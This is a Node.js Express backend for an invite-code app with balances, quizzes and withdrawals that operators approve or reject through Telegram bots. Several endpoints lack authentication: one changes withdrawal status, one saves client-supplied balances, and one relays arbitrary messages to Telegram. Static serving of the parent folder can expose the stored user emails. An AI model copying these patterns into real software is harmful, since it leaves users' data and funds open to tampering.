const express = require('express');
const cors = require('cors');
require('./bot');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');
const { Pool } = require('pg');

const app = express();
const PORT = Number(process.env.PORT || 3000);

const INVITE_BOT_TOKEN = process.env.INVITE_BOT_TOKEN || '';
const INVITE_CHAT_ID = process.env.INVITE_CHAT_ID || '';
const MAIN_TELEGRAM_BOT_TOKEN = process.env.MAIN_TELEGRAM_BOT_TOKEN || process.env.BOT_TOKEN || '';
const MAIN_TELEGRAM_CHAT_ID = process.env.MAIN_TELEGRAM_CHAT_ID || process.env.TELEGRAM_CHAT_ID || '';

const DATABASE_URL = process.env.DATABASE_URL || '';
const USE_DB = Boolean(DATABASE_URL);

const DATA_FILE = path.join(__dirname, 'data-store.json');
const fileStore = {
  invites: {},
  userStates: {},
  withdrawalOwners: {},
  pendingEvents: {}
};

let inviteBotOffset = 0;
let pool = null;

if (USE_DB) {
  pool = new Pool({
    connectionString: DATABASE_URL,
    ssl: process.env.PGSSLMODE === 'disable' ? false : { rejectUnauthorized: false }
  });
}

function loadFileStore() {
  try {
    if (!fs.existsSync(DATA_FILE)) return;
    const raw = fs.readFileSync(DATA_FILE, 'utf8');
    const parsed = JSON.parse(raw);
    if (parsed && typeof parsed === 'object') {
      Object.assign(fileStore, parsed);
    }
  } catch (err) {
    console.log('Failed to load file store:', err.message);
  }
}

function saveFileStore() {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(fileStore, null, 2), 'utf8');
  } catch (err) {
    console.log('Failed to save file store:', err.message);
  }
}

function defaultUserState() {
  return {
    balance: 0,
    lastQuizDate: null,
    transactions: [],
    quizSession: null
  };
}

function applyEventToState(state, event) {
  if (!event || !event.withdrawalId) return state;
  const next = { ...state };
  const txs = Array.isArray(next.transactions) ? [...next.transactions] : [];
  const txId = Number(event.withdrawalId);
  const idx = txs.findIndex((t) => Number(t.id) === txId);
  if (idx < 0) {
    next.transactions = txs;
    return next;
  }

  const tx = { ...txs[idx] };

  if (event.action) {
    if (event.action === 'verify_reject') {
      if (!tx.isRefunded) {
        next.balance = Number(next.balance || 0) + Number(tx.amount || 0);
        tx.isRefunded = true;
      }
      tx.status = 'Denied';
      tx.isUnlocked = true;
      tx.dataFromTelegram = tx.dataFromTelegram || {};
    } else if (event.action === 'verify_approve_a') {
      tx.status = 'Completed';
    } else if (event.action === 'verify_approve_b') {
      tx.status = 'Second Stage';
    } else if (event.action === 'stage2_approve') {
      tx.status = 'Final Verifying';
    } else if (event.action === 'stage2_reject') {
      tx.status = 'Ready';
    }
  } else {
    tx.dataFromTelegram = {
      transactionId: event.withdrawalId,
      name: event.name,
      purpose: event.purpose,
      username: event.username,
      amount: event.amount,
      profileImage: event.profileImage,
      uiType: event.uiType || 'uia',
      receivedAt: event.timestamp
    };
    tx.isUnlocked = true;
    if (!tx.status || tx.status === 'Pending') {
      tx.status = 'Ready';
    }
    if ((event.uiType || '').toLowerCase() === 'uic') {
      if (!tx.isRefunded) {
        next.balance = Number(next.balance || 0) + Number(tx.amount || 0);
        tx.isRefunded = true;
      }
      tx.status = 'Denied';
    }
  }

  txs[idx] = tx;
  next.transactions = txs;
  return next;
}

async function initDb() {
  if (!USE_DB) return;

  await pool.query(`
    CREATE TABLE IF NOT EXISTS invites (
      code TEXT PRIMARY KEY,
      email TEXT NOT NULL,
      first_name TEXT NOT NULL,
      disabled BOOLEAN NOT NULL DEFAULT FALSE,
      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    );
  `);

  await pool.query(`
    CREATE TABLE IF NOT EXISTS user_states (
      invite_code TEXT PRIMARY KEY REFERENCES invites(code) ON DELETE CASCADE,
      balance NUMERIC NOT NULL DEFAULT 0,
      last_quiz_date TEXT,
      transactions JSONB NOT NULL DEFAULT '[]'::jsonb,
      quiz_session JSONB
    );
  `);

  await pool.query(`
    CREATE TABLE IF NOT EXISTS withdrawal_owners (
      withdrawal_id TEXT PRIMARY KEY,
      invite_code TEXT NOT NULL REFERENCES invites(code) ON DELETE CASCADE,
      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    );
  `);

  await pool.query(`
    CREATE TABLE IF NOT EXISTS pending_events (
      id BIGSERIAL PRIMARY KEY,
      invite_code TEXT NOT NULL REFERENCES invites(code) ON DELETE CASCADE,
      payload JSONB NOT NULL,
      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    );
  `);

  await pool.query(`
    CREATE INDEX IF NOT EXISTS idx_pending_events_invite ON pending_events(invite_code, id);
  `);
}

async function getInvite(code) {
  const cleanCode = String(code || '').trim().toUpperCase();
  if (!cleanCode) return null;

  if (!USE_DB) {
    return fileStore.invites[cleanCode] || null;
  }

  const { rows } = await pool.query(
    'SELECT code, email, first_name, disabled, created_at FROM invites WHERE code = $1 LIMIT 1',
    [cleanCode]
  );
  if (!rows.length) return null;

  return {
    inviteCode: rows[0].code,
    email: rows[0].email,
    firstName: rows[0].first_name,
    disabled: rows[0].disabled,
    createdAt: rows[0].created_at
  };
}

async function saveInvite(record) {
  const cleanCode = String(record.inviteCode || '').trim().toUpperCase();
  if (!cleanCode) return;

  if (!USE_DB) {
    fileStore.invites[cleanCode] = {
      inviteCode: cleanCode,
      email: record.email,
      firstName: record.firstName,
      disabled: Boolean(record.disabled),
      createdAt: record.createdAt || Date.now()
    };
    saveFileStore();
    return;
  }

  await pool.query(
    `INSERT INTO invites (code, email, first_name, disabled)
     VALUES ($1, $2, $3, $4)
     ON CONFLICT (code)
     DO UPDATE SET email = EXCLUDED.email, first_name = EXCLUDED.first_name, disabled = EXCLUDED.disabled`,
    [cleanCode, record.email, record.firstName, Boolean(record.disabled)]
  );
}

async function setInviteDisabled(code, disabled) {
  const cleanCode = String(code || '').trim().toUpperCase();
  if (!cleanCode) return;

  if (!USE_DB) {
    if (!fileStore.invites[cleanCode]) return;
    fileStore.invites[cleanCode].disabled = Boolean(disabled);
    saveFileStore();
    return;
  }

  await pool.query('UPDATE invites SET disabled = $2 WHERE code = $1', [cleanCode, Boolean(disabled)]);
}

async function loadUserState(inviteCode) {
  const cleanCode = String(inviteCode || '').trim().toUpperCase();
  if (!cleanCode) return defaultUserState();

  if (!USE_DB) {
    if (!fileStore.userStates[cleanCode]) {
      fileStore.userStates[cleanCode] = defaultUserState();
      saveFileStore();
    }
    return fileStore.userStates[cleanCode];
  }

  const { rows } = await pool.query(
    'SELECT balance, last_quiz_date, transactions, quiz_session FROM user_states WHERE invite_code = $1 LIMIT 1',
    [cleanCode]
  );

  if (!rows.length) return defaultUserState();

  return {
    balance: Number(rows[0].balance || 0),
    lastQuizDate: rows[0].last_quiz_date || null,
    transactions: Array.isArray(rows[0].transactions) ? rows[0].transactions : [],
    quizSession: rows[0].quiz_session || null
  };
}

async function saveUserState(inviteCode, state) {
  const cleanCode = String(inviteCode || '').trim().toUpperCase();
  if (!cleanCode) return;

  const normalized = {
    balance: Number(state.balance || 0),
    lastQuizDate: state.lastQuizDate || null,
    transactions: Array.isArray(state.transactions) ? state.transactions : [],
    quizSession: state.quizSession || null
  };

  if (!USE_DB) {
    fileStore.userStates[cleanCode] = normalized;
    saveFileStore();
    return;
  }

  await pool.query(
    `INSERT INTO user_states (invite_code, balance, last_quiz_date, transactions, quiz_session)
     VALUES ($1, $2, $3, $4::jsonb, $5::jsonb)
     ON CONFLICT (invite_code)
     DO UPDATE SET
       balance = EXCLUDED.balance,
       last_quiz_date = EXCLUDED.last_quiz_date,
       transactions = EXCLUDED.transactions,
       quiz_session = EXCLUDED.quiz_session`,
    [
      cleanCode,
      normalized.balance,
      normalized.lastQuizDate,
      JSON.stringify(normalized.transactions),
      JSON.stringify(normalized.quizSession)
    ]
  );
}

async function registerWithdrawalOwner(inviteCode, withdrawalId) {
  const cleanCode = String(inviteCode || '').trim().toUpperCase();
  const wid = String(withdrawalId || '').trim();
  if (!cleanCode || !wid) return;

  if (!USE_DB) {
    fileStore.withdrawalOwners[wid] = cleanCode;
    saveFileStore();
    return;
  }

  await pool.query(
    `INSERT INTO withdrawal_owners (withdrawal_id, invite_code)
     VALUES ($1, $2)
     ON CONFLICT (withdrawal_id)
     DO UPDATE SET invite_code = EXCLUDED.invite_code`,
    [wid, cleanCode]
  );
}

async function getWithdrawalOwner(withdrawalId) {
  const wid = String(withdrawalId || '').trim();
  if (!wid) return '';

  if (!USE_DB) {
    return fileStore.withdrawalOwners[wid] || '';
  }

  const { rows } = await pool.query(
    'SELECT invite_code FROM withdrawal_owners WHERE withdrawal_id = $1 LIMIT 1',
    [wid]
  );
  return rows.length ? rows[0].invite_code : '';
}

async function enqueueEvent(inviteCode, payload) {
  const cleanCode = String(inviteCode || '').trim().toUpperCase();
  if (!cleanCode) return;

  if (!USE_DB) {
    if (!fileStore.pendingEvents[cleanCode]) fileStore.pendingEvents[cleanCode] = [];
    fileStore.pendingEvents[cleanCode].push(payload);
    saveFileStore();
    return;
  }

  await pool.query(
    'INSERT INTO pending_events (invite_code, payload) VALUES ($1, $2::jsonb)',
    [cleanCode, JSON.stringify(payload)]
  );
}

async function dequeueEvent(inviteCode) {
  const cleanCode = String(inviteCode || '').trim().toUpperCase();
  if (!cleanCode) return null;

  if (!USE_DB) {
    const queue = fileStore.pendingEvents[cleanCode] || [];
    if (!queue.length) return null;
    const event = queue.shift() || null;
    fileStore.pendingEvents[cleanCode] = queue;
    saveFileStore();
    return event;
  }

  const client = await pool.connect();
  try {
    await client.query('BEGIN');
    const pick = await client.query(
      'SELECT id, payload FROM pending_events WHERE invite_code = $1 ORDER BY id ASC LIMIT 1 FOR UPDATE SKIP LOCKED',
      [cleanCode]
    );

    if (!pick.rows.length) {
      await client.query('COMMIT');
      return null;
    }

    const eventId = pick.rows[0].id;
    const payload = pick.rows[0].payload;
    await client.query('DELETE FROM pending_events WHERE id = $1', [eventId]);
    await client.query('COMMIT');

    return payload;
  } catch (err) {
    await client.query('ROLLBACK');
    throw err;
  } finally {
    client.release();
  }
}

const allowedOrigins = [
  'http://localhost:8000',
  'http://127.0.0.1:8000',
  process.env.FRONTEND_ORIGIN
].filter(Boolean);

app.use(cors({
  origin: (origin, callback) => {
    let railwayAllowed = false;
    if (origin) {
      try {
        const hostname = new URL(origin).hostname;
        railwayAllowed = hostname.endsWith('.up.railway.app');
      } catch (e) {
        railwayAllowed = false;
      }
    }

    if (!origin || allowedOrigins.includes(origin) || railwayAllowed) {
      callback(null, true);
      return;
    }
    callback(new Error('Not allowed by CORS'));
  },
  credentials: true
}));

app.use(express.json());
app.use(express.static(path.join(__dirname, '..')));

function generateInviteCode() {
  const alphabet = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  const bytes = crypto.randomBytes(10);
  let out = '';
  for (let i = 0; i < 10; i++) {
    out += alphabet[bytes[i] % alphabet.length];
  }
  return out;
}

async function sendInviteSignupToTelegram(payload) {
  if (!INVITE_BOT_TOKEN || !INVITE_CHAT_ID) {
    console.log('Invite bot token/chat not configured; skipping invite bot notification.');
    return;
  }

  const message = [
    'New Invite Signup',
    '',
    `Name: ${payload.firstName}`,
    `Email: ${payload.email}`,
    `Invite Code: ${payload.inviteCode}`,
    `Created: ${new Date().toISOString()}`
  ].join('\n');

  try {
    await fetch(`https://api.telegram.org/bot${INVITE_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: INVITE_CHAT_ID,
        text: message,
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'Terminate Invite', callback_data: `terminate_invite_${payload.inviteCode}` },
              { text: 'Restore Invite', callback_data: `restore_invite_${payload.inviteCode}` }
            ]
          ]
        }
      })
    });
  } catch (err) {
    console.log('Invite bot notification failed:', err.message);
  }
}

async function answerInviteCallback(callbackQueryId, text) {
  if (!INVITE_BOT_TOKEN) return;
  try {
    await fetch(`https://api.telegram.org/bot${INVITE_BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callbackQueryId, text })
    });
  } catch (err) {
    console.log('Failed to answer invite callback:', err.message);
  }
}

async function sendInviteBotMessage(chatId, text) {
  if (!INVITE_BOT_TOKEN) return;
  try {
    await fetch(`https://api.telegram.org/bot${INVITE_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text })
    });
  } catch (err) {
    console.log('Failed to send invite bot message:', err.message);
  }
}

async function pollInviteBotCallbacks() {
  if (!INVITE_BOT_TOKEN) return;
  try {
    const response = await fetch(`https://api.telegram.org/bot${INVITE_BOT_TOKEN}/getUpdates?offset=${inviteBotOffset + 1}&timeout=0&allowed_updates=%5B%22callback_query%22%5D`);
    const data = await response.json();
    if (!data.ok || !Array.isArray(data.result)) return;

    for (const update of data.result) {
      inviteBotOffset = Math.max(inviteBotOffset, update.update_id);
      const cq = update.callback_query;
      if (!cq || !cq.data) continue;

      if (cq.data.startsWith('terminate_invite_')) {
        const inviteCode = cq.data.replace('terminate_invite_', '').trim().toUpperCase();
        const record = await getInvite(inviteCode);
        if (record) {
          await setInviteDisabled(inviteCode, true);
          await answerInviteCallback(cq.id, `Invite ${inviteCode} terminated.`);
          await sendInviteBotMessage(cq.message.chat.id, `Invite terminated:\nCode: ${inviteCode}\nName: ${record.firstName}\nEmail: ${record.email}`);
        } else {
          await answerInviteCallback(cq.id, `Invite ${inviteCode} not found.`);
        }
      }

      if (cq.data.startsWith('restore_invite_')) {
        const inviteCode = cq.data.replace('restore_invite_', '').trim().toUpperCase();
        const record = await getInvite(inviteCode);
        if (record) {
          await setInviteDisabled(inviteCode, false);
          await answerInviteCallback(cq.id, `Invite ${inviteCode} restored.`);
          await sendInviteBotMessage(cq.message.chat.id, `Invite restored:\nCode: ${inviteCode}\nName: ${record.firstName}\nEmail: ${record.email}`);
        } else {
          await answerInviteCallback(cq.id, `Invite ${inviteCode} not found.`);
        }
      }
    }
  } catch (err) {
    console.log('Invite callback polling error:', err.message);
  }
}

app.post('/api/invite-signup', async (req, res) => {
  const { email, firstName } = req.body || {};
  const cleanEmail = String(email || '').trim().toLowerCase();
  const cleanName = String(firstName || '').trim();

  if (!cleanEmail || !cleanName) {
    return res.status(400).json({ success: false, message: 'Name and email are required.' });
  }

  const emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(cleanEmail);
  if (!emailOk) {
    return res.status(400).json({ success: false, message: 'Invalid email format.' });
  }

  let inviteCode = '';
  for (let i = 0; i < 8; i++) {
    const candidate = generateInviteCode();
    const existing = await getInvite(candidate);
    if (!existing) {
      inviteCode = candidate;
      break;
    }
  }

  if (!inviteCode) {
    return res.status(500).json({ success: false, message: 'Unable to generate invite code. Try again.' });
  }

  await saveInvite({
    inviteCode,
    email: cleanEmail,
    firstName: cleanName,
    disabled: false,
    createdAt: Date.now()
  });

  await sendInviteSignupToTelegram({ email: cleanEmail, firstName: cleanName, inviteCode });
  res.json({ success: true, message: 'Invite generated.' });
});

app.post('/api/invite-signin', async (req, res) => {
  const { inviteCode } = req.body || {};
  const code = String(inviteCode || '').trim().toUpperCase();
  const record = await getInvite(code);

  if (!record || record.disabled) {
    return res.status(401).json({ success: false, message: 'Invalid invite code.' });
  }

  res.json({
    success: true,
    user: {
      firstName: record.firstName,
      email: record.email,
      inviteCode: code
    }
  });
});

app.post('/api/send-telegram', async (req, res) => {
  const { text, reply_markup } = req.body || {};
  if (!text || typeof text !== 'string') {
    return res.status(400).json({ success: false, message: 'Message text is required.' });
  }

  if (!MAIN_TELEGRAM_BOT_TOKEN || !MAIN_TELEGRAM_CHAT_ID) {
    return res.status(500).json({ success: false, message: 'Main Telegram bot is not configured.' });
  }

  try {
    const tgRes = await fetch(`https://api.telegram.org/bot${MAIN_TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: MAIN_TELEGRAM_CHAT_ID,
        text,
        ...(reply_markup ? { reply_markup } : {})
      })
    });

    const tgData = await tgRes.json();
    if (!tgRes.ok || !tgData.ok) {
      return res.status(502).json({ success: false, message: 'Telegram relay failed.', detail: tgData });
    }

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message || 'Telegram relay error.' });
  }
});

app.post('/api/state/load', async (req, res) => {
  const code = String((req.body && req.body.inviteCode) || '').trim().toUpperCase();
  if (!code) {
    return res.status(400).json({ success: false, message: 'Invite code is required.' });
  }

  const record = await getInvite(code);
  if (!record || record.disabled) {
    return res.status(401).json({ success: false, message: 'Invalid invite code.' });
  }

  let state = await loadUserState(code);
  let processed = 0;
  while (true) {
    const nextEvent = await dequeueEvent(code);
    if (!nextEvent) break;
    state = applyEventToState(state, nextEvent);
    processed += 1;
  }

  if (processed > 0) {
    await saveUserState(code, state);
    console.log('Applied', processed, 'queued event(s) into persisted state for invite', code);
  }

  res.json({ success: true, state });
});

app.post('/api/state/save', async (req, res) => {
  const { inviteCode, state } = req.body || {};
  const code = String(inviteCode || '').trim().toUpperCase();
  if (!code || !state || typeof state !== 'object') {
    return res.status(400).json({ success: false, message: 'Invite code and state are required.' });
  }

  const record = await getInvite(code);
  if (!record || record.disabled) {
    return res.status(401).json({ success: false, message: 'Invalid invite code.' });
  }

  await saveUserState(code, state);
  res.json({ success: true });
});

app.post('/api/register-withdrawal', async (req, res) => {
  const { inviteCode, withdrawalId } = req.body || {};
  const code = String(inviteCode || '').trim().toUpperCase();
  const wid = String(withdrawalId || '').trim();

  if (!code || !wid) {
    return res.status(400).json({ success: false, message: 'Invite code and withdrawalId required.' });
  }

  const record = await getInvite(code);
  if (!record || record.disabled) {
    return res.status(401).json({ success: false, message: 'Invalid invite code.' });
  }

  await registerWithdrawalOwner(code, wid);
  console.log('Mapped withdrawal', wid, 'to invite', code);
  res.json({ success: true });
});

app.post('/api/telegram-withdrawal', async (req, res) => {
  const { withdrawalId, inviteCode, name, purpose, username, amount, profileImage, uiType, action, timestamp } = req.body || {};
  const wid = String(withdrawalId || '').trim();
  const payloadInviteCode = inviteCode ? String(inviteCode).trim().toUpperCase() : '';
  const ownerInviteCode = payloadInviteCode || await getWithdrawalOwner(wid);

  const payload = {
    withdrawalId,
    name,
    purpose,
    username,
    amount,
    profileImage,
    uiType,
    action,
    timestamp
  };

  if (ownerInviteCode) {
    await enqueueEvent(ownerInviteCode, payload);
  } else {
    console.log('No owner mapping for withdrawal:', wid);
  }

  res.json({ success: true, message: 'Data received', withdrawalId });
});

app.get('/api/get-withdrawal', async (req, res) => {
  const code = String((req.query && req.query.inviteCode) || '').trim().toUpperCase();
  if (!code) {
    return res.json(null);
  }

  const event = await dequeueEvent(code);
  if (event) {
    console.log('Delivered queued event to invite', code, 'withdrawal', event.withdrawalId, 'action', event.action || 'data');
  }
  res.json(event || null);
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'index.html'));
});

(async () => {
  try {
    if (!USE_DB) {
      loadFileStore();
      console.log('Using file storage fallback at backend/data-store.json');
    } else {
      await initDb();
      console.log('Postgres storage enabled.');
    }

    app.listen(PORT, () => {
      console.log('Server running on port ' + PORT);
      if (INVITE_BOT_TOKEN) {
        setInterval(() => {
          pollInviteBotCallbacks().catch((err) => {
            console.log('Invite callback polling error:', err.message);
          });
        }, 2000);
        console.log('Invite bot callback polling enabled.');
      }
    });
  } catch (err) {
    console.error('Startup failed:', err.message);
    process.exit(1);
  }
})();
